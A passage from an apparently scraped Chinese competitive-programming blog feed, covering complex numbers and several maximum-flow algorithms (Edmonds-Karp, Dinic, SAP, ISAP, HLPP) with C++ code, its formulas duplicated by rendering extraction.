z_1z​1​​×z​2​​=z​2​​×z​1​​(z1z2)z3=z1(z2z3)(z_1z_2)z_3=z_1(z_2z_3)(z​1​​z​2​​)z​3​​=z​1​​(z​2​​z​3​​)z1(z2+z3)=z1z2+z1z3z_1(z_2+z_3)=z_1z_2+z_1z_3z​1​​(z​2​​+z​3​​)=z​1​​z​2​​+z​1​​z​3​​共轭复数当两个复数实部相等，虚部互为相反数时，就称其互为共轭复数qwq特别地，若复数的虚部不为零时，也称作互为共轭虚数。对于复数 z=a+biz=a+biz=a+bi (a,b∈Ra,b\in Ra,b∈R)，它的共轭复数用z¯=a−bi\bar z=a-bi​z​¯​​=a−bi(a,b∈Ra,b\in Ra,b∈R)来表示。 共轭复数有如下基本性质z1±z2‾=z1‾±z2‾\overline{z_1\pm z_2}=\overline{z_1}\pm \overline{z_2}​z​1​​±z​2​​​​​=​z​1​​​​​±​z​2​​​​​z1z2‾=z1‾&nbsp;z2‾\overline{z_1z_2}=\overline{z_1} \ \overline{z_2}​z​1​​z​2​​​​​=​z​1​​​​​&nbsp;​z​2​​​​​(z1z2)‾=z1‾z2‾\overline{(\frac {z_1}{z_2})}=\frac{\overline{z_1}}{\overline{z_2}}​(​z​2​​​​z​1​​​​)​​​=​​z​2​​​​​​​​z​1​​​​​​​zn‾=(z‾)n\overline{z^n}=(\overline z)^n​z​n​​​​​=(​z​​​)​n​​z+z‾=2Re(z),z−z‾=2iIm(z)z+\overline z=2Re(z),z-\overline z=2iIm(z)z+​z​​​=2Re(z),z−​z​​​=2iIm(z)z‾‾=z\overline {\overline z}=z​​z​​​​​​=zzzz 是实数的充分必要条件是 z‾=z\overline z=z​z​​​=z ;zzz 是纯虚数的充分必要条件是 z‾=−z\overline z=-z​z​​​=−z 且 z≠0z\neq0z≠0例题已知复数 z1=(m−3)+(m−1)i,z2=(2m−5)+(m2+m−2)iz_1=(m-3)+(m-1)i,z_2=(2m-5)+(m^2+m-2)iz​1​​=(m−3)+(m−1)i,z​2​​=(2m−5)+(m​2​​+m−2)i ，且 z1&gt;z2‾z_1&gt;\overline {z_2}z​1​​&gt;​z​2​​​​​ ，试求实数 mmm 的值解:由 z1&gt;z2‾z_1&gt;\overline {z_2}z​1​​&gt;​z​2​​​​​ 可知， 、 都是实数也就是有：m−1=0−(m2+m−2)=0\begin{array}{c}m-1=0\\-(m^2+m-2)=0\end{array}​m−1=0​−(m​2​​+m−2)=0​​解得 m=1m=1m=1因为z1&gt;z2‾z_1&gt;\overline{z_2}z​1​​&gt;​z​2​​​​​，所以m−3&lt;2m−5m-3&lt;2m-5m−3&lt;2m−5，也就是m&lt;2m&lt;2m&lt;2m=1m=1m=1满足m&lt;2m&lt;2m&lt;2复平面复平面引入我们想想如何在平面直角坐标系中表示复数我们可以自己想一种表示方法：对于 z=a+biz=a+biz=a+bi ,它对应的坐标为 (a,b)(a,b)(a,b) .其中，aaa 表示的是复平面内的横坐标，bbb 表示的是复平面内的纵坐标，表示实数 aaa 的点都在 xxx 轴上，所以 xxx 轴又称为实轴；表示纯虚数 bbb 的点都在 yyy 轴上，所以 yyy 轴又称为虚轴 yyy 轴有且仅有一个实点即为原点 OOO复数的表示三角表示法在 z≠0z\neq 0z≠0 的情况下，以正实轴为始边，以表示 zzz 的向量 ZZZ 为终边的角的弧度数 θ\thetaθ 称为 zzz 的辐角，叫做 argz=θ\arg z=\thetaargz=θ，显然的我们可以发现一个规律：tan(argz)=yx\tan(\arg z)={y\over x}tan(argz)=​x​​y​​相信大家都学过任意角吧，所以对于任何一个复数 zzz 有无数个幅角，如果 θp\theta_pθ​p​​ 是其中的一个，那么 argz=θp+2kπ,k∈Z\arg z=\theta_p+2k\pi,k\in Zargz=θ​p​​+2kπ,k∈Z 就是 zzz 的所有幅角了呢qwq但是那么多角不会很麻烦吗qwq我们规定一个主要的就可以了呢，于是我们就规定一个我们最熟悉的：把 −π&lt;θ&lt;π-\pi&lt;\theta&lt;\pi−π&lt;θ&lt;π 叫做 argz\arg zargz 的主值，argz=θ0\arg z=\theta_0argz=θ​0​​当 z=0z=0z=0 时，∣z∣=0|z|=0∣z∣=0，显然幅角不确定qwq相信大家都知道极坐标吧qwq 什么？你说不知道？自己百度去qwq这里就直接给出式子了，对于极坐标 (θ,r)(\theta,r)(θ,r) 可以在平面直角坐标系中表示为 (rcosθ,rsinθ)(r\cos \theta,r\sin \theta)(rcosθ,rsinθ)那么对于一个复数 zzz 我们就可以表示为 z=r(cosθ+isinθ)z=r(\cos \theta+i\sin\theta)z=r(cosθ+isinθ)质数表示法相信大家都知道欧拉公式吧（不知道也没关系，背过就行了qwqeiθ=cosθ+isinθe^{i\theta}=\cos \theta+i\sin\thetae​iθ​​=cosθ+isinθ由上面的 z=r(cosθ+isinθ)z=r(\cos \theta+i\sin\theta)z=r(cosθ+isinθ) 可以得到 z=reiθz=re^{i\theta}z=re​iθ​​欧拉公式刚刚已经提到过 eiθ=cosθ+isinθe^{i\theta}=\cos\theta+i\sin\thetae​iθ​​=cosθ+isinθ我们来简单证明一下由 TaylorTaylorTaylor 展开可得江 TaylorTaylorTaylor 展开运用到复数域上，有复数运算 ±i=±i,(±i)2=−1,(±i)3=∓i,(±i)4=1\pm i=\pm i,(\pm i)^2=-1,(\pm i)^3=\mp i,(\pm i)^4=1±i=±i,(±i)​2​​=−1,(±i)​3​​=∓i,(±i)​4​​=1 ，可得证毕有什么用呢qwq?将 xxx 换成 π\piπ，就出现了 eπi=−1e^{\pi i}=-1e​πi​​=−1，即 eπi+1=0e^{\pi i}+1=0e​πi​​+1=0，被誉为上帝创造的公式将 xxx 换成 2kπ&nbsp;&nbsp;(k∈Z)2k\pi\ \ (k\in \mathbb{Z})2kπ&nbsp;&nbsp;(k∈Z)，就出现了 e2kπi=1e^{2k\pi i}=1e​2kπi​​=1本文就讲到这里吧qwq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>FFT</tag>
        <tag>玄学</tag>
        <tag>NTT</tag>
        <tag>复数</tag>
        <tag>复平面</tag>
        <tag>虚数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「网络流」常用的几种最大流算法]]></title>
    <url>%2Farticles%2FNetwork-flow-Algorithms%2F</url>
    <content type="text"><![CDATA[今天把网络流的几种算法肝完了qwq然后写炸了qwq，调了一下午网络流.......快读中间也写炸过一次.......看来以后应该多打代码......我们上一篇Blog讲了讲Dinic算法，其实求最大流并非只有Dinic一种算法，也并非最有，这一篇我们来讲讲网络流的其他算法qwq不知道网络流的基本知识的同学可以去看看我的上一篇qwqFord-Fulkerson方法Ford−FulkersonFord-FulkersonFord−Fulkerson 方法是一种十分有效的求最大流的算法 但不是最快的qwqFord-Fulkerson伪代码:Ford-Fulkerson-Method(G,S,T)\text {Ford-Fulkerson-Method}(G,S,T)Ford-Fulkerson-Method(G,S,T)initialize flowf to 0\text{initialize flow}f \text{ to } 0initialize flowf to 0while\text{while}while have an augmenting path \text{have an augmenting path }have an augmenting path ppp in\text{in}in GfG_fG​f​​ augment flow f along p\ \ \ \ \text{augment flow }f \text{ along } p augment flow f along preturn f\text{return }freturn fEdmond-Karp算法Edmond−KarpEdmond-KarpEdmond−Karp 算法是 Ford-Fulkerson\text{Ford-Fulkerson}Ford-Fulkerson 方法的一种..Edmond−KarpEdmond-KarpEdmond−Karp 算法思路：通过 BFSBFSBFS 拓展合法节点，找到汇点，并记录每个节点的前面节点 preipre_ipre​i​​通过preipre_ipre​i​​，从汇点回溯回源点，记录下每条弧流量的最小值 minf\min fminf, ans=ans+minfans = ans+ \min fans=ans+minf（否则就会超出某条边的限制流量将所有经过的边的流量减去 minf\min fminf，反向边加上重复上述步骤，直到找不到增广路，算法结束伪代码:咕咕咕朴素版EK：最为简单的写法，通过邻接矩阵存储优点：代码简单，一目了然。缺点：轻易爆内存，(n2)(n^2)(n​2​​)的空间太大，n&gt;10000n &gt;10000n&gt;10000 基本就废了（MLE预定）评测：洛谷模版题 505050 分邻接表EK时间复杂度：O(m2n)O(m^2n)O(m​2​​n)Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;stack&gt;#include &lt;queue&gt;const int MAXN = 10000 + 10;const int MAXM = 100000 + 20;#define DEBUG(x) std::cerr &lt;&lt; "#DEBUG (" &lt;&lt; #x &lt;&lt; "):" &lt;&lt; #x &lt;&lt; " is " &lt;&lt; x &lt;&lt; '\n';int m, n;int S, T;int maxflow;int tot;int head[MAXN];int ver[MAXM], next[MAXM], edge[MAXM];int flow[MAXM];int pre[MAXM];int v[MAXN];inline int min (const int &amp;a, const int &amp;b) &#123; return a &gt; b ? b : a;&#125;inline void addedge (int from, int to, int dist) &#123; ver[++tot] = to, edge[tot] = dist, next[tot] = head[from], head[from] = tot; ver[++tot] = from, edge[tot] = 0, next[tot] = head[to], head[to] = tot;&#125;bool bfs () &#123; std::queue &lt;int&gt; q; memset (v, 0, sizeof (v)); v[S] = 1; q.push(S); flow[S] = 1 &lt;&lt; 29; while (q.size()) &#123; int from = q.front(); q.pop(); for (int i = head[from]; i; i = next[i]) &#123; if (edge[i]) &#123; int to = ver[i]; if (v[to]) continue; pre[to] = i; flow[to] = min (flow[from], edge[i]); // this is "edge[i]" , not "edge[from]"!!!! v[to] = 1; q.push(to); if (to == T) return 1; &#125; &#125; &#125; return 0;&#125;void update () &#123; int x = T; while (x != S) &#123; int i = pre[x]; edge[i] -= flow[T]; edge[i ^ 1] += flow[T]; x = ver[i ^ 1]; &#125; maxflow += flow[T];&#125;inline int SlowRead () &#123; char ch = 0; int data = 0, f = 1; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if (ch == '-') f = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; data = data * 10 + ch - '0'; ch = getchar(); &#125; return data * f;&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead(); m = SlowRead(); S = SlowRead(); T = SlowRead(); tot = 1; for (int i = 1; i &lt;= m; i++) &#123; int x = SlowRead(), y = SlowRead(), z = SlowRead(); addedge(x, y, z); &#125; while (bfs()) update(); // Edmond-Karp printf("%d", maxflow); return 0;&#125;Dinic 算法DinicDinicDinic 算法的过程:遍历残量网络，建立层次图；在层次图上寻找任意一条增广路，进行增广，并将答案加上增广流量；重复第 2 步，直至层次图中不存在增广路，回到第 1 步重新建立层次图；直到层次图无法建立，则当前流量即为最大流量。每次建立层次图后都可以进行多次增广，无法增广时重新建立层次图，此时的层次图不再包含之前进行增广后满载的边。无法建立层次图时，说明源点到汇点的任意一条简单路径中，都至少有一条边满载，这也在直观上验证了最小割最大流定理Dinic(G,S,T)\text{Dinic}(G,S,T)Dinic(G,S,T)make Layered graph in G\text{make Layered graph in }Gmake Layered graph in Gdo\text{do}do augment flow f along p\ \ \ \ \text{augment flow }f \text{ along } p augment flow f along puntil there do not any augmenting flow in G\text{until there do not any augmenting flow in } Guntil there do not any augmenting flow in Ggoto 1 remake Layered graph until cannot make Layered graph\text{goto 1 remake Layered graph until cannot make Layered graph}goto 1 remake Layered graph until cannot make Layered graphDinicDinicDinic 有一个常见的优化—当前弧优化该优化基于一个显而易见的事实，每次建立层次图后，如果在某一次增广前，某个点有一条边增广过了，则这条边在当前的层次图中不会再用到了，即下一次 DFSDFSDFS 这个点的时候直接可以从这条边的下一条边开始时间复杂度：O(n2m)O(n^2m)O(n​2​​m)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;cstdio&gt;#include &lt;climits&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;const int MAXN = 100 + 10;struct Node;struct Edge;struct Node &#123; Edge *firstEdge; int level;&#125; nodes[MAXN + 2];struct Edge &#123; Node *from, *to; int capacity, flow; Edge *next, *reversedEdge; Edge(Node *from, Node *to, int capacity) : from(from), to(to), capacity(capacity), flow(0), next(from-&gt;firstEdge) &#123;&#125;&#125;;int n, n1;inline void addEdge(int from, int to, int capacity) &#123; nodes[from].firstEdge = new Edge(&amp;nodes[from], &amp;nodes[to], capacity); nodes[to].firstEdge = new Edge(&amp;nodes[to], &amp;nodes[from], 0); nodes[from].firstEdge-&gt;reversedEdge = nodes[to].firstEdge, nodes[to].firstEdge-&gt;reversedEdge = nodes[from].firstEdge;&#125;struct Dinic &#123; bool makeLevelGraph(Node *s, Node *t) &#123; for (int i = 0; i &lt; n + 1; i++) nodes[i].level = 0; std::queue&lt;Node *&gt; q; q.push(s); s-&gt;level = 1; while (!q.empty()) &#123; Node *v = q.front(); q.pop(); for (Edge *e = v-&gt;firstEdge; e; e = e-&gt;next) &#123; if (e-&gt;flow &lt; e-&gt;capacity &amp;&amp; e-&gt;to-&gt;level == 0) &#123; e-&gt;to-&gt;level = v-&gt;level + 1; if (e-&gt;to == t) return true; else q.push(e-&gt;to); &#125; &#125; &#125; return false; &#125; int findPath(Node *s, Node *t, int limit = INT_MAX) &#123; if (s == t) return limit; for (Edge *e = s-&gt;firstEdge; e; e = e-&gt;next) &#123; if (e-&gt;to-&gt;level == s-&gt;level + 1 &amp;&amp; e-&gt;capacity &gt; e-&gt;flow) &#123; int flow = findPath(e-&gt;to, t, std::min(limit, e-&gt;capacity - e-&gt;flow)); if (flow &gt; 0) &#123; e-&gt;flow += flow; e-&gt;reversedEdge-&gt;flow -= flow; return flow; &#125; &#125; &#125; return 0; &#125; int operator()(int s, int t) &#123; int ans = 0; while (makeLevelGraph(&amp;nodes[s], &amp;nodes[t])) &#123; int flow; while ((flow = findPath(&amp;nodes[s], &amp;nodes[t])) &gt; 0) ans += flow; &#125; return ans; &#125;&#125; dinic;int main(int argc, char *const argv[]) &#123;#ifndef FILE freopen("flyer.in", "r", stdin); freopen("flyer.out", "w", stdout);#endif scanf("%d %d", &amp;n, &amp;n1); const int s = 0, t = n + 1; for (int i = 1; i &lt;= n1; i++) addEdge(s, i, 1); for (int i = n1 + 1; i &lt;= n; i++) addEdge(i, t, 1); while (!feof(stdin)) &#123; int u, v; scanf("%d %d", &amp;u, &amp;v); if (u &gt; v) std::swap(u, v); addEdge(u, v, 1); &#125; printf("%d\n", dinic(s, t));#ifndef FILE fclose(stdin); fclose(stdout);#endif return 0;&#125;// 完美结束qwqSAP 算法1、距离标号：所谓距离标号 ，就是某个点到汇点的最少的弧的数量（即边权值为1时某个点到汇点的最短路径长度）设点 iii 的标号为 levelilevel_ilevel​i​​，那么如果将满足 leveli=levelj+1level_i=level_j+1level​i​​=level​j​​+1 的弧 (i,j)(i,j)(i,j) 叫做允许弧 ，且增广时只走允许弧2、断层（本算法的 GapGapGap 优化思想）gapigap_igap​i​​ 数组表示距离标号为 iii 的点有多少个，如果到某一点没有符合距离标号的允许弧，我那么需要修改距离标号来找到增广路如果重标号使得 gapgapgap 数组中原标号数目变为 000 ，则算法结束我们学过毒瘤的EKEKEK算法，我们想想优化－如果能让每次寻找增广路时的时间复杂度降下来，那么就能提高算法效率了，使用距离标号的最短增广路算法就是这样的SAP(G,S,T)\text{SAP}(G,S,T)SAP(G,S,T)initialize level, gap \text{initialize} \text{ level, gap }initialize level, gap find e(u,v) with leveli=levelj+1\text{find }e(u,v)\text{ with level}_i=\text{level}_j+1find e(u,v) with level​i​​=level​j​​+1find augmenting path along e(u,v)\text {find augmenting path along e}(u,v)find augmenting path along e(u,v)SAPSAPSAP Code:from:https://blog.csdn.net/txl199106/article/details/656320021234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;using namespace std;#define MAXN 222#define inf 100000000+1000int map[MAXN][MAXN];//存图int pre[MAXN];//记录当前点的前驱int level[MAXN];//记录距离标号int gap[MAXN];//gap常数优化int NV,NE; //入口参数vs源点，vt汇点int SAP(int vs,int vt)&#123; memset(pre,-1,sizeof(pre)); memset(level,0,sizeof(level)); memset(gap,0,sizeof(gap)); gap[0]=vt; int v,u=pre[vs]=vs,maxflow=0,aug=inf; while(level[vs]&lt;vt) &#123; //寻找可行弧 for(v=1;v&lt;=vt;v++) &#123; if(map[u][v]&gt;0&amp;&amp;level[u]==level[v]+1)&#123; break; &#125; &#125; if(v&lt;=vt) &#123; pre[v]=u; u=v; if(v==vt) &#123; int neck=0; aug=inf; //寻找当前找到的一条路径上的最大流 , (瓶颈边) for(int i=v;i!=vs;i=pre[i]) &#123; if(aug&gt;map[pre[i]][i]) &#123; aug=map[pre[i]][i]; neck=i; &#125; &#125; maxflow+=aug; //更新残留网络 for(int i=v;i!=vs;i=pre[i])&#123; map[pre[i]][i]-=aug; map[i][pre[i]]+=aug; &#125; u=vs; //从源点开始继续搜 // u=neck; // Dnic 多路增广优化，下次增广时，从瓶颈边(后面)开始 &#125; &#125; else &#123; //找不到可行弧 int minlevel=vt; //寻找与当前点相连接的点中最小的距离标号 for(v=1;v&lt;=vt;v++)&#123; if(map[u][v]&gt;0&amp;&amp;minlevel&gt;level[v])&#123; minlevel=level[v]; &#125; &#125; gap[level[u]]--;//(更新gap数组）当前标号的数目减1； if(gap[level[u]]==0)break;//出现断层 level[u]=minlevel+1; gap[level[u]]++; u=pre[u]; &#125; &#125; return maxflow;&#125; int main()&#123; int n,m,u,v,cap; while(~scanf("%d%d",&amp;m,&amp;n)) &#123; memset(map,0,sizeof(map)); for(int i=1;i&lt;=m;i++) &#123; scanf("%d%d%d",&amp;u,&amp;v,&amp;cap); map[u][v]+=cap; &#125; printf("%d\n",SAP(1,n)); &#125; return 0;&#125;ISAP算法原图存在两种子图，一个是残量网络，一个是允许弧组成的图残量网络保证可增广，允许弧保证最短路（时间界较优）所以，在寻找增广路的过程中，一直是在残量网络中沿着允许弧寻找。因此，允许弧应该是属于残量网络的，而非原图的换句话说，我们沿着允许弧，走的是残量网络（而非原图）中的最短路径当我们找到沿着残量网络找到一条增广路，增广后，残量网络肯定会变化（至少少了一条边），因此决定允许弧的 ddd 数组要进行相应的更新（顺便提一句，DinicDinicDinic 的做法就是每次增广都重新计算 ddd 数组）然而，ISAP 「改进」的地方之一就是，其实没有必要马上更新 ddd 数组。这是因为，去掉一条边只可能令路径变得更长，而如果增广之前的残量网络存在另一条最短路，并且在增广后的残量网络中仍存在，那么这条路径毫无疑问是最短的。所以，ISAP 的做法是继续增广，直到遇到死路，才执行 retreat\text{retreat}retreat 操作说到这里，大家应该都猜到了，retreat\text{retreat}retreat 操作的主要任务就是更新 ddd 数组。那么怎么更新呢？非常简单：假设是从节点 uuu 找遍了邻接边也没找到允许弧的；再设一变量 mmm，令 mmm 等于残量网络中 uuu 的所有邻接点的 ddd 数组的最小值，然后令 d[u]d[u]d[u] 等于 m+1m+1m+1 即可。这是因为，进入 retreat\text{retreat}retreat 环节说明残量网络中 uuu 和 ttt 已经不能通过（已过时）的允许弧相连那么 uuu 和 ttt 实际上在残量网络中的最短路的长是多少呢？（这正是 ddd 的定义！）显然是残量网络中 uuu 的所有邻接点和 ttt 的距离加 111 的最小情况。特殊情况是，残量网络中 uuu 根本没有邻接点。如果是这样，只需要把 d[u]d[u]d[u] 设为一个比较大的数即可，这会导致任何点到 uuu 的边被排除到残量网络以外（严格来说只要大于等于 ∣V∣|V|∣V∣ 即可。由于最短路一定是无环的，因此任意路径长最大是 ∣V∣|V|∣V∣ ）修改之后，只需要把正在研究的节点 uuu 沿着刚才走的路退一步，然后继续搜索即可Code :参考http://www.renfei.org/blog/isap.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586int source; // 源点int sink; // 汇点int p[max_nodes]; // 可增广路上的上一条弧的编号int num[max_nodes]; // 和 t 的最短距离等于 i 的节点数量int cur[max_nodes]; // 当前弧下标int d[max_nodes]; // 残量网络中节点 i 到汇点 t 的最短距离bool visited[max_nodes];// 预处理, 反向 BFS 构造 d 数组bool bfs() &#123; memset(visited, 0, sizeof(visited)); queue&lt;int&gt; Q; Q.push(sink); visited[sink] = 1; d[sink] = 0; while (!Q.empty()) &#123; int u = Q.front(); Q.pop(); for (iterator_t ix = G[u].begin(); ix != G[u].end(); ++ix) &#123; Edge &amp;e = edges[(*ix)^1]; if (!visited[e.from] &amp;&amp; e.capacity &gt; e.flow) &#123; visited[e.from] = true; d[e.from] = d[u] + 1; Q.push(e.from); &#125; &#125; &#125; return visited[source];&#125;// 增广int augment() &#123; int u = sink, df = __inf; // 从汇点到源点通过 p 追踪增广路径, df 为一路上最小的残量 while (u != source) &#123; Edge &amp;e = edges[p[u]]; df = min(df, e.capacity - e.flow); u = edges[p[u]].from; &#125; u = sink; // 从汇点到源点更新流量 while (u != source) &#123; edges[p[u]].flow += df; edges[p[u]^1].flow -= df; u = edges[p[u]].from; &#125; return df;&#125;int max_flow() &#123; int flow = 0; bfs(); memset(num, 0, sizeof(num)); for (int i = 0; i &lt; num_nodes; i++) num[d[i]]++; int u = source; memset(cur, 0, sizeof(cur)); while (d[source] &lt; num_nodes) &#123; if (u == sink) &#123; flow += augment(); u = source; &#125; bool advanced = false; for (int i = cur[u]; i &lt; G[u].size(); i++) &#123; Edge&amp; e = edges[G[u][i]]; if (e.capacity &gt; e.flow &amp;&amp; d[u] == d[e.to] + 1) &#123; advanced = true; p[e.to] = G[u][i]; cur[u] = i; u = e.to; break; &#125; &#125; if (!advanced) &#123; // retreat int m = num_nodes - 1; for (iterator_t ix = G[u].begin(); ix != G[u].end(); ++ix) if (edges[*ix].capacity &gt; edges[*ix].flow) m = min(m, d[edges[*ix].to]); if (--num[d[u]] == 0) break; // gap 优化 num[d[u] = m+1]++; cur[u] = 0; if (u != source) u = edges[p[u]].from; &#125; &#125; return flow;&#125;Other 方法以上介绍的方法都是基于增广路算法qwq最高标号预流推进(HLPP) 算法算法思想预流推进算法将每个点看做一个可以存储流的“水池”，其中存有流的点称为活动节点对于每个非s或t的点，流入该点的流只可能有两个去向：流入汇点t，流回源点s;预流推进算法从源点开始沿边向其它点推流，之后每次选一个活动节点通过推流，试图使其变得不活动。当所有节点都是不活动节点时，算法就结束了;以上是传统预流推进算法的主要思想。而最高标号预流推进算法就是先预处理了一个距离标号h，通过堆或优先队列，没次选出h最大的点进行推流，以减少重复操作，降低了复杂度。算法步骤通过bfs预处理出距离标号h，即到达汇点t的最短距离;将从源点s出发的边设为满流，到达的点v标记为活动节点并加入到优先队列中;从优先队列中不断取出点u进行推流操作，要求到达点v的必须满足h(u)==h(v)+1;若推流后u中仍有余流，则进行重标号。将h(u)设为min{h(v)}，再次加入优先队列并重复步骤3;当优先队列为空时，结束算法。算法复杂度：O(n2m)O(n^2\sqrt m)O(n​2​​√​m​​​)！！！qwq1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283struct line &#123; int to,next,cap; line() &#123; next=-1; &#125;&#125;edge[MAXM];struct data &#123; int x,h,ef; friend bool operator&lt; (const data &amp;a,const data &amp;b)&#123; return a.h&lt;b.h; &#125;&#125;node[MAXN];priority_queue&lt;data&gt; q;queue&lt;int&gt; tmpq;inline void add(int u,int v,int w) &#123; edge[cnt].next=head[u]; head[u]=cnt; edge[cnt].to=v; edge[cnt].cap=w; ++cnt;&#125;void bfs(int t) &#123; tmpq.push(t); vis[t]=true; int u,v; while(tmpq.size()) &#123; u=tmpq.front(); for(int i=head[u];i!=-1;i=edge[i].next) &#123; v=edge[i].to; if(!vis[v]) &#123; node[v].h=node[u].h+1; tmpq.push(v); vis[v]=true; &#125; &#125; tmpq.pop(); &#125;&#125;int hlpp(int n,int s,int t) &#123; for(int i=1;i&lt;=n;++i) node[i].x=i; bfs(); data tmp; int u,v,f,tmph; for(int i=head[s];i!=-1;i=edge[i].next) &#123; v=edge[i].to; edge[i^1].cap+=edge[i].cap; node[v].ef+=edge[i].cap; edge[i].cap=0; q.push(node[v]); &#125; node[s].h=n; while(q.size()) &#123; tmp=q.top(); q.pop(); u=tmp.x; tmph=INF; for(int i=head[u];i!=-1 &amp;&amp; node[u].ef;i=edge[i].next) &#123; v=edge[i].to; if(edge[i].cap) &#123; if(node[u].h==node[v].h+1) &#123; if(v!=s &amp;&amp; v!=t &amp;&amp; node[v].ef==0) q.push(node[v]); f=min(edge[i].cap,node[u].ef); edge[i].cap-=f; edge[i^1].cap+=f; node[u].ef-=f; node[v].ef+=f; &#125; else tmph=min(tmph,node[v].h); &#125; if(node[u].ef) &#123; node[u].h=tmph+1; q.push(node[u]); &#125; &#125; return node[t].ef;&#125;参考资料:网络流－最大流问题 ISAP 算法解释图论专题小结：最大流算法之ISAP算法Dinic pk ISAP网络流 最大流—最小割 之SAP算法 详解网络流最大流之SAP算法 详解最大流算法-最高标号预流推进(HLPP)最大流——HLPP算法最大流算法之EK（最短路径增广算法）Dinic学习笔记]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>网络流</tag>
        <tag>增广路</tag>
        <tag>最大流</tag>
        <tag>dinic</tag>
        <tag>EK</tag>
        <tag>图论</tag>
        <tag>图</tag>
        <tag>费用流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「网络流」Dinic算法学习笔记]]></title>
    <url>%2Farticles%2Fdinic%2F</url>
    <content type="text"><![CDATA[最近大蒟蒻Shq学习了最大流Dinic算法，但是毕竟他太弱辣，于是他只能水一发Blog防止自己忘记Dinic算法是一个十分常用的算法，但是在这之前，我们先来简单介绍一下网络流的基本知识网络流介绍什么是网络流？不知道不知道，此篇完.......网络流就是在一个有向图上选择一个源点，一个汇点你：网络流那么简单qwq！当然不是qwq网络流还有一些性质没有说容量：capacity(e)\mathrm{capacity}(e)capacity(e) 表示一条有向边 e(u,v)e(u, v)e(u,v) 的最大允许的流量流量：flow(e)\mathrm{flow}(e)flow(e) 表示一条有向边 e(u,v)e(u, v)e(u,v) 总容量中已被占用的流量剩余容量：即 capacity(e)−flow(e)\mathrm{capacity}(e) - \mathrm{flow}(e)capacity(e)−flow(e)，表示当前时刻某条有向边 e(u,v)\mathrm{e}(u, v)e(u,v) 总流量中未被占用的部分反向边：原图中每一条有向边在残量网络中都有对应的反向边，反向边的容量为 ∞\infty∞，容量的变化与原边相反；『反向边』的概念是相对的，即一条边的反向边的反向边是它本身残量网络：在原图的基础之上，添加每条边对应的反向边，并储存每条边的当前流量。残量网络会在算法进行的过程中被修改增广路（augmenting path）：残量网络中从源点到汇点的一条路径，增广路上所有边中最小的剩余容量为增广流量增广（augmenting）：在残量网络中寻找一条增广路，并将增广路上所有边的流量加上增广流量的过程层次：level(u)\mathrm{level}(u)level(u)表示节点 uuu 在层次图中与源点的距离层次图：在原残量网络中按照每个节点的层次来分层，只保留相邻两层的节点的图，满载（即流量等于容量）的边不存在于层次图中比如这个，就是网络的一个流共有源点 SSS ,汇点TTT，和其余 555 个点组成，在有向图上以 undefined$表示qwq一些结论我们可以得出一些结论:对于任意一条边 e(u,v)e(u,v)e(u,v)，都有 0≤capacity(e)−flow(e)0\le\mathrm{capacity}(e) - \mathrm{flow}(e)0≤capacity(e)−flow(e)对于任意的点sss，有undefined$flow(u,v)=−flow(v,u)\text{flow}(u,v)=-\text{flow}(v,u)flow(u,v)=−flow(v,u)那么，问题来了，挖掘机技术那家强？什么叫做最大流呢qwq?最大流就是起点到终点的最大流量我们来看这样一个网路（才不是懒得画图呢qwqDinicDinicDinic 算法的过程:遍历残量网络，建立层次图；在层次图上寻找任意一条增广路，进行增广，并将答案加上增广流量；重复第 2 步，直至层次图中不存在增广路，回到第 1 步重新建立层次图；直到层次图无法建立，则当前流量即为最大流量。每次建立层次图后都可以进行多次增广，无法增广时重新建立层次图，此时的层次图不再包含之前进行增广后满载的边。无法建立层次图时，说明源点到汇点的任意一条简单路径中，都至少有一条边满载，这也在直观上验证了最小割最大流定理编程实现技巧虽然说我们已经想明白了为什么要加反向边，但反向边如何具体实现呢？笔者在学习网络流的时候在这里困扰了好久，现在简要的总结在这里首先讲一下邻接矩阵的做法，对于，如果我们要对其反向边进行处理，直接修改 即可但有时会出现 u→vu\to vu→v 和 v→uv\to uv→u 同时本来就有边的情况，一种方法是加入一个新点 ppp ，使 u→vu\to vu→v，而 v→uv\to uv→u 变成 v→pv\to pv→p, p→up\to up→u另一种方法就是使用邻接表，我们把边从 000 开始编号，每加入一条原图中的边 u→vu\to vu→v 时，加入边 v→uv\to uv→u 流量设为 000，那么这时对于编号为 iii 的边 u→vu\to vu→v，我们就可以知道i&nbsp;xor&nbsp;1i \text{ xor } 1i&nbsp;xor&nbsp;1就是其反向边 v→uv\to uv→u当前弧优化DinicDinicDinic 有一个常见的优化——当前弧优化该优化基于一个显而易见的事实，每次建立层次图后，如果在某一次增广前，某个点有一条边增广过了，则这条边在当前的层次图中不会再用到了，即下一次 DFSDFSDFS 这个点的时候直接可以从这条边的下一条边开始Code某网络流二十四题代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;cstdio&gt;#include &lt;climits&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;const int MAXN = 100 + 10;struct Node;struct Edge;struct Node &#123; Edge *firstEdge; int level;&#125; nodes[MAXN + 2];struct Edge &#123; Node *from, *to; int capacity, flow; Edge *next, *reversedEdge; Edge(Node *from, Node *to, int capacity) : from(from), to(to), capacity(capacity), flow(0), next(from-&gt;firstEdge) 